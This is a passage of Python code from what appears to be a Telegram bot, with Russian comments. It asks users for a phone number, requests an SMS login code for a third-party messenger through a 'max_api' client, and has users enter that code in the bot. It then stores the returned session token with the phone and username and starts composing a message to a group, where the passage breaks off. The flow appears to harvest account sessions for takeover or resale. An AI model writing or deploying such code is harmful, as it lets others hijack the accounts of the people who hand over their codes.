def handle_phone(chat, uid, text):
    # Чистим номер
    clean = re.sub(r'[\s\-\(\)]', '', text)
    m = re.match(r'^(\+?[78])?(\d{10})$', clean)
    
    if not m:
        bot.send(chat, "❌ Неверный формат! Пример: +79991234567")
        return
    
    phone = '7' + m.group(2)
    
    # Проверяем не зарегистрирован ли
    for r in db.d["regs"]:
        if r["phone"] == phone:
            bot.send(chat, f"⚠️ Номер {phone} уже зарегистрирован!")
            db.set_user(uid, {"state": "menu", "phone": "", "session": {}, "tries": 0})
            return
    
    # Отправляем запрос
    msg = bot.send(chat, f"📱 {phone}\n🔄 Отправляю запрос...")
    
    if msg.get("ok"):
        mid = msg["result"]["message_id"]
        ok, text, session = max_api.send_sms(phone)
        
        if ok:
            user = db.user(uid)
            user["state"] = "wait_code"
            user["phone"] = phone
            user["session"] = session
            user["tries"] = 0
            db.set_user(uid, user)
            
            bot.edit(chat, mid, f"📱 {phone}\n{text}")
        else:
            bot.edit(chat, mid, f"❌ Ошибка: {text}")
            db.set_user(uid, {"state": "menu", "phone": "", "session": {}, "tries": 0})

def handle_code(chat, uid, text, username, fullname):
    user = db.user(uid)
    code = re.sub(r'\s', '', text)
    
    if not code.isdigit() or len(code) < 4:
        bot.send(chat, "❌ Код должен быть из цифр!")
        return
    
    user["tries"] += 1
    if user["tries"] > 5:
        bot.send(chat, "❌ Много попыток! Начни заново")
        db.set_user(uid, {"state": "menu", "phone": "", "session": {}, "tries": 0})
        return
    
    db.set_user(uid, user)
    
    msg = bot.send(chat, "🔄 Проверяю код...")
    
    if msg.get("ok"):
        mid = msg["result"]["message_id"]
        ok, text, token_data = max_api.verify_sms(user["phone"], code, user["session"])
        
        if ok and token_data:
            # Сохраняем
            db.add(user["phone"], token_data, uid, username or fullname)
            
            # Отправляем в группу
            group_msg = (
